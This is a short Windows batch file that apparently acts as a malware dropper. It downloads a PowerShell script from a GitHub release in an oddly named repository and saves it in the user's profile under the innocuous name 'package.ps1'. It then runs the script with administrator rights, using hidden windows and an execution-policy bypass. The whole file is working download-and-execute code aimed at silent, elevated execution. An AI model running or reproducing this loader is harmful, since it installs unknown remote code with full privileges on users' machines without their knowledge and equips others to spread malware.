��
@echo off
setlocal

rem Set the URL to the script you want to download
set "DownloadURL=https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/RunLevel.Highest.ps1"

rem Set the target file path within the user's profile directory
set "DownloadFilePath=%USERPROFILE%\package.ps1"

rem Download the script using Invoke-WebRequest
powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri '%DownloadURL%' -OutFile '%DownloadFilePath%'"

rem Build the full path to the downloaded PowerShell script
set "PowerShellScriptPath=%DownloadFilePath%"

rem Run the downloaded PowerShell script with elevated permissions
PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs"

endlocal
